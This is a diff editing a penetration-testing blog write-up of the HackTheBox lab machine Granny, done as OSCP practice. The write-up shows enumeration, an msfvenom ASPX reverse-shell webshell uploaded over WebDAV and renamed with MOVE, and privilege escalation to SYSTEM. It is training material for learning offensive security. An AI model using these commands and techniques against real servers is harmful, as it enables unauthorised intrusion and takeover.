@@ -9,11 +9,11 @@ tags:
   - web
 ---
 
-For the my next OSCP-prep box (again curtesy of TJNull's excellent [list of OSCP-like HackTheBox machines][htb-list]) I decided to choose a Windows machine. I picked the first from the list that I hadn't already attempted, Granny.
+For my next OSCP-prep box (again courtesy of TJNull's excellent [list of OSCP-like HackTheBox machines][htb-list]) I decided to choose a Windows machine. I picked the first from the list that I hadn't already attempted, Granny.
 
 ## Phase 1: Enumeration
 
-Just like with shocker, I begin by kicking off [AutoRecon][autorecon] on the target.
+I begin by kicking off [AutoRecon][autorecon] on the target.
 
 ```bash
 autorecon -o granny --single-target 10.10.10.15
@@ -32,7 +32,7 @@ We can start enumerating that while the full `nmap` scan is still running. As wi
 ffuf -u http://10.10.10.15/FUZZ -w /usr/share/seclists/Discovery/Web-Content/raft-large-directories-lowercase.txt -e .asp,.aspx,.ashx,.asmx,.html,.exe,.dll -of csv -o ./raft-large-exts.csv -recursion -recursion-strategy greedy
 ```
 
-The `nmap` http enumeration has finished by now, and it looks like it picked up some MS FrontPage endpoints... and a vulnerable FrontPage installation.
+The `nmap` http enumeration finished while that `ffuf` scan was running, and it looks like it picked up some MS FrontPage endpoints and a vulnerable FrontPage installation.
 
 ```
 | http-enum: 
@@ -78,7 +78,7 @@ While that is going we can inspect the rest of the `nmap` HTTP output. This next
 
 ## Phase 2: Exploitation
 
-This host allows for WebDAV usage, which ideally could be exploited to upload a webshell to the server. We can use `davtest` to check the WebDAV configuration of the webserver. Ideally we could proxy `davtest` through burp to get the WebDAV requests in an easily editable format, but `davtest` doesn't have a proxy feature natively. A neat trick that I learned from [IppSec][ippsec] is that you can specify a past-through proxy in Burp Suite on localhost:80 and then direct `davtest` at localhost.
+This host allows for WebDAV usage, which could be exploited to upload a webshell to the server. We can use `davtest` to check the WebDAV configuration of the webserver. Ideally we could proxy `davtest` through burp to get the WebDAV requests in an easily editable format, but `davtest` doesn't have a proxy feature natively. A neat trick that I learned from [IppSec][ippsec] is that you can specify a pass-through proxy in Burp Suite on localhost:80 and then direct `davtest` at localhost.
 
 ![](/assets/images/HTB/granny/granny-burp-proxy-setup.png)
 
@@ -116,17 +116,17 @@ PUT html SUCCEED: http://localhost/DavTestDir_Iqdz9inIgLQYklF/davtest_Iqdz9inIgL
 PUT php SUCCEED: http://localhost/DavTestDir_Iqdz9inIgLQYklF/davtest_Iqdz9inIgLQYklF.php
 ```
 
-It looks like we aren't able to upload `.asp` or `.aspx` files, which would have made our lives a lot easier. However, if we remember the output of the `http-webdav-scan`, we are allowed to use the `MOVE` method. `MOVE` allows us to, well, move files around on the web server (duh), but this also allows us to change the name and extension of the files we move around. Our exploitation plan is now to use WebDAV to upload an `.aspx` webshell as a text file, then use `MOVE` to change it to an ASPX file that the server will execute. First things first, lets generate a webshell using `msfvenom`.
+It looks like we aren't able to upload `.asp` or `.aspx` files, which would have made our lives a lot easier. However, if we remember the output of the `http-webdav-scan`, we are allowed to use the `MOVE` method. `MOVE` allows us to, well, move files around on the web server (duh), but it also allows us to change the name and extension of files we move. The plan is now to use WebDAV to upload an `.aspx` webshell as a text file, then use `MOVE` to change it to an ASPX file that the server will execute. First things first, let's generate a webshell using `msfvenom`.
 
 ```bash
 msfvenom -p windows/shell/reverse_tcp -f aspx LHOST=tun0 LPORT=443 -o shell.aspx
 ```
 
-Next, lets use one of our proxied PUT requests in Burp to upload the contents of `shell.aspx` as a text file.
+Next, let's use one of our proxied PUT requests in Burp to upload the contents of `shell.aspx` as a text file.
 
 ![](/assets/images/HTB/granny/granny-put-webshell.png)
 
-And now we can use `MOVE` to switch it from a `txt` file to an `aspx` file.
+And now we can use the WebDAV `MOVE` command to switch it from a `txt` file to an `aspx` file.
 
 ![](/assets/images/HTB/granny/granny-move-webshell.png)
 
@@ -158,7 +158,7 @@ meterpreter > getuid
 Server username: NT AUTHORITY\NETWORK SERVICE
 ```
 
-Interesting, since we are a NT AUTHORITY service I can already suspect we might be able to do some token impersonation. Lets use [windows-exploit-suggester][wes] to see what vulnerabilities this box is susceptible too!
+Interesting, since we are a NT AUTHORITY service I can already suspect we might be able to do some token impersonation. Lets use [windows-exploit-suggester][wes] to see what vulnerabilities this box is susceptible too.
 
 **Victim**
 
@@ -231,7 +231,7 @@ whoami
 nt authority\system
 ```
 
-And thats a wrap on granny. I spent a majority of my time on this box setting up my build environment, but at least I won't have to go through that pain again... right?
+And thats a wrap on Granny. I spent a majority of my time on this box setting up my build environment, but at least I won't have to go through that pain again... right?
 
 [htb-list]: https://docs.google.com/spreadsheets/d/1dwSMIAPIam0PuRBkCiDI88pU3yzrqqHkDtBngUHNCw8/edit#gid=1839402159
 [autorecon]: https://github.com/Tib3rius/AutoRecon
